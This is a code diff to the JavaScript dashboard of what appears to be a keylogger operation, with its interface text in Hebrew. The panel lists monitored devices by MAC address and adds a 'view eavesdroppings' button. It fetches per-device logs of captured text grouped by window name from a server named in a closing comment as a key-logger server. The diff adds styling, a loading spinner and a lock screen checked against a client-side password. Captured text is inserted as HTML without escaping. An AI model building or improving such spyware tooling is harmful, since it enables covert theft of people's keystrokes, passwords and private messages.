@@ -104,21 +104,43 @@ function renderDevices() {
     const grid = document.getElementById('devicesGrid');
     let htmlStr = '';
     devices.forEach(device => {
+        const timeRemainingHTML = device.timeLimit ? 
+            `<div class="time-remaining">
+                <span class="icon">⏱️</span> זמן נותר: ${formatTimeRemaining(device.timeLimit)}
+             </div>` : '';
+        
         htmlStr += `
             <div class="device-card">
                 <div class="device-header">
                     <span class="device-name">${device.name || device.macAddress}</span>
-                    <span class="status-indicator ${device.connected ? 'status-connected' : 'status-disconnected'}"></span>
+                    <div class="status-wrapper">
+                        <span class="status-indicator ${device.connected ? 'status-connected' : 'status-disconnected'}"></span>
+                        <span class="status-text">${device.connected ? 'מחובר' : 'מנותק'}</span>
+                    </div>
                 </div>
                 <div class="device-info">
-                    <div>MAC: ${device.macAddress}</div>
-                    <div>סטטוס: ${device.connected ? 'מחובר' : 'מנותק'}</div>
-                    ${device.timeLimit ? `<div>זמן נותר: ${formatTimeRemaining(device.timeLimit)}</div>` : ''}
-                    <div>אחסון: ${device.storageLocation || ''}</div>
-                    <div>נראה לאחרונה: ${device.lastSeen || ''}</div>
+                    <div class="info-item">
+                        <span class="info-label">מזהה:</span>
+                        <span class="info-value">${device.macAddress}</span>
+                    </div>
+                    ${timeRemainingHTML}
+                    <div class="info-item">
+                        <span class="info-label">אחסון:</span>
+                        <span class="info-value">${device.storageLocation === 'server' ? 'שרת מרכזי' : 'קובץ מקומי'}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">עדכון אחרון:</span>
+                        <span class="info-value">${device.lastSeen || 'לא ידוע'}</span>
+                    </div>
                 </div>
-                <button class="button" onclick="openSettings('${device.macAddress}')">הגדרות</button>
-                <button class="button" onclick="switchToEavesdropping('${device.macAddress}')">צפה בהאזנות</button>
+                <div class="card-actions">
+                    <button class="button settings-button" onclick="openSettings('${device.macAddress}')">
+                        <span class="icon">⚙️</span> הגדרות
+                    </button>
+                    <button class="button view-button" onclick="switchToEavesdropping('${device.macAddress}')">
+                        <span class="icon">👁️</span> צפה בהאזנות
+                    </button>
+                </div>
             </div>
         `;
     });
@@ -129,7 +151,13 @@ function formatTimeRemaining(timeLimit) {
     const days = Math.floor(timeLimit / (24 * 60));
     const hours = Math.floor((timeLimit % (24 * 60)) / 60);
     const minutes = timeLimit % 60;
-    return `${days}d ${hours}h ${minutes}m`;
+    
+    let formattedTime = '';
+    if (days > 0) formattedTime += `${days} ימים `;
+    if (hours > 0) formattedTime += `${hours} שעות `;
+    if (minutes > 0) formattedTime += `${minutes} דקות`;
+    
+    return formattedTime.trim() || '0 דקות';
 }
 
 function openSettings(macAddress) {
@@ -205,10 +233,11 @@ async function saveSettings() {
 // Eavesdropping Section
 async function fetchLogs(mac) {
     const url = `${SERVER_URL}/api/data/files`;
+    const formattedMac = mac.replaceAll(':', '_'); // החלפת נקודותיים בקו תחתי
     try {
         const response = await fetch(url, {
             method: 'GET',
-            headers: { 'Content-Type': 'application/json', 'mac-address': mac }
+            headers: { 'Content-Type': 'application/json', 'mac-address': formattedMac }
         });
         if (!response.ok) throw new Error('שגיאה בטעינת ההאזנות');
         originalLogs = await response.json();
@@ -243,6 +272,61 @@ function parseLogs(logObject) {
     return result;
 }
 
+function showLoading(show = true) {
+    const loadingMessage = document.getElementById('loadingMessage');
+    if (show) {
+        loadingMessage.style.display = 'flex';
+        loadingMessage.innerHTML = `
+            <div class="loading-spinner"></div>
+            <div>טוען נתונים...</div>`;
+    } else {
+        loadingMessage.style.display = 'none';
+    }
+}
+
+function lockScreen() {
+    const lockScreen = document.getElementById('lockScreen');
+    lockScreen.classList.add('active');
+    
+    // אפקט גליץ' קל
+    setTimeout(() => {
+        lockScreen.style.animation = 'glitch 0.2s linear';
+        setTimeout(() => {
+            lockScreen.style.animation = '';
+        }, 200);
+    }, 300);
+}
+
+function attemptUnlock() {
+    const password = document.getElementById('unlockPassword').value;
+    if (password === SYSTEM_PASSWORD) {
+        const lockScreen = document.getElementById('lockScreen');
+        lockScreen.classList.remove('active');
+        document.getElementById('unlockPassword').value = '';
+        resetLockTimer();
+        
+        // אפקט הצלחה
+        const mainContainer = document.getElementById('mainContainer');
+        mainContainer.style.animation = 'pulse 0.5s';
+        setTimeout(() => {
+            mainContainer.style.animation = '';
+        }, 500);
+    } else {
+        const lockContent = document.querySelector('.lock-content');
+        lockContent.style.animation = 'glitch 0.3s linear';
+        setTimeout(() => {
+            lockContent.style.animation = '';
+        }, 300);
+        
+        // רעידת שדה הסיסמה
+        const passwordInput = document.getElementById('unlockPassword');
+        passwordInput.classList.add('shake-error');
+        setTimeout(() => {
+            passwordInput.classList.remove('shake-error');
+        }, 500);
+    }
+}
+
 function populateWindowList(logArray) {
     const windowSet = new Set();
     logArray.forEach(entry => entry.logs.forEach(logItem => windowSet.add(logItem.windowName)));
@@ -259,22 +343,34 @@ function populateWindowList(logArray) {
 function displayLogs(arrayToDisplay) {
     const container = document.getElementById('logContainer');
     container.innerHTML = '';
+    
     if (arrayToDisplay.length === 0) {
-        container.innerHTML = `<div class="no-results">לא נמצאו רשומות תואמות לסינון</div>`;
+        container.innerHTML = `
+            <div class="no-results">
+                <div class="no-results-icon">🔍</div>
+                <div>לא נמצאו רשומות תואמות לסינון</div>
+            </div>`;
         return;
     }
+    
     arrayToDisplay.forEach(entry => {
         const tsDiv = document.createElement('div');
         tsDiv.className = 'log-entry';
+        
         const timeLabel = document.createElement('div');
         timeLabel.className = 'timestamp';
-        timeLabel.textContent = entry.fullDateStr;
+        timeLabel.innerHTML = `<span class="icon">🕓</span> ${entry.fullDateStr}`;
         tsDiv.appendChild(timeLabel);
+        
         entry.logs.forEach(logItem => {
             const windowDiv = document.createElement('div');
-            windowDiv.innerHTML = `<strong>${logItem.windowName}:</strong> ${logItem.text}`;
+            windowDiv.className = 'log-item';
+            windowDiv.innerHTML = `
+                <div class="window-name">${logItem.windowName}</div>
+                <div class="log-text">${logItem.text}</div>`;
             tsDiv.appendChild(windowDiv);
         });
+        
         container.appendChild(tsDiv);
     });
 }
@@ -318,3 +414,4 @@ document.addEventListener('DOMContentLoaded', () => {
         if (e.key === 'Enter') attemptUnlock();
     });
 });
+// https://key-logger-server.onrender.com/api/files/list
